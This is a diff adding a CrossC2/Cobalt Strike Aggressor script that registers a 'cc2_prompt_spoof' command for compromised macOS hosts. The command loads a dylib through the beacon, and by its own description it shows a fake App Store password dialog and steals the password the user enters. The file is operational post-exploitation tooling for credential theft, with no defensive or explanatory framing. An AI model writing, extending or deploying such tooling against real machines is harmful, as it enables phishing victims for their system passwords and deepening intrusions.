@@ -1,0 +1,34 @@
+
+include(script_resource("CrossC2Kit.cna"));
+
+sub printUsage_prompt_spoof {
+    blog($1, "\nUsage: cc2_prompt_spoof <linux(32)/osx> <process display name>\nEx:\n\tcc2_prompt_spoof osx English");
+}
+
+ssh_alias cc2_prompt_spoof {
+    $taskName = "cc2_prompt_spoof"; # taskName
+    $taskType = "dylib";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # info -> normal message
+
+    $beaconid = $1;
+    $arch = $2;
+    $displayName = $3;
+    $transportArg = $displayName."^";
+
+    if ($arch eq "osx") {
+        $loadlib = "gather/prompt/osx/prompt_spoof.dylib";
+    } else {
+        berror($beaconid, "*[error]: Only supports osx.");
+        printUsage_prompt_spoof($beaconid);
+        return;
+    }
+    if ($displayName) {
+        blog($beaconid, "cc2_prompt_spoof: " . $displayName);
+        bcrossc2_load_dyn($beaconid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    } else {
+        printUsage_prompt_spoof($beaconid);
+    }
+
+}
+
+ssh_command_register("cc2_prompt_spoof", "CrossC2 prompt_spoof - (AppStore) interface pops up and prompts the user to enter a password, stealing the entered password", "\nUsage: cc2_prompt_spoof <linux(32)/osx> <process display name>\nEx:\n\tcc2_prompt_spoof osx English");
